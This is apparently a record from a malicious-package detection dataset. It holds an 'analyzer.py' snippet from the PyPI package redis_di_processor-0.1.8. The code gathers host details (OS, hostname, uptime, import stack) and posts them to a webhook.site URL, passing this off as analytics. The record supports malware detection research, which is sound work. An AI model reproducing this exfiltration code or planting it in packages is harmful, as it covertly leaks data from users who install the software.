[
  {
    "pyfile": "analyzer.py",
    "malicious_code_snippets": "import platform\nimport socket\nimport time\nimport psutil\nimport requests\nimport traceback\n\ndef find_import_stack():\n    stack = traceback.extract_stack()\n    stack_info = []\n    for frame in stack:\n        stack_info.append({\n            'file': frame.filename,\n            'line': frame.lineno,\n            'function': frame.name,\n            'code': frame.line.strip(),\n        })\n    return stack_info\n\ndef find_import_context():\n    stack = traceback.extract_stack()\n    for frame in reversed(stack):\n        if \"site-packages\" in frame.filename or \"dist-packages\" in frame.filename:\n            return frame.filename\n    return \"Unknown\"\n\ndef analytics():\n    os_info = platform.system()\n    uptime = time.time() - psutil.boot_time()\n    stack_info = find_import_stack()\n    context = find_import_context()\n    data = {\n        'os': os_info,\n        'uptime': uptime,\n        'hostname': socket.gethostname(),\n        'package_info': __name__,\n        'context': context,\n        'import_stack': stack_info,\n    }\n    try:\n        response = requests.post('https://webhook.site/baf67bd8-bf43-41ae-8af2-4a0fb906f90d/analytics', json=data)\n        if response.status_code == 200:\n            print(\"Analytics sent successfully.\")\n        else:\n            print(f\"Failed to send analytics. Status code: {response.status_code}\")\n    except Exception as e:\n        print(f\"Error sending analytics: {e}\")\n\nif __name__ == \"__main__\":\n    analytics()"
  },
  {
    "metadata": {
      "package_name": "redis_di_processor-0.1.8",
      "report_path": "/home/blue/PyPIAgent/Codes/tooldetect/detect_output/guarddog/malware/redis_di_processor-0.1.8.txt"
    }
  }
]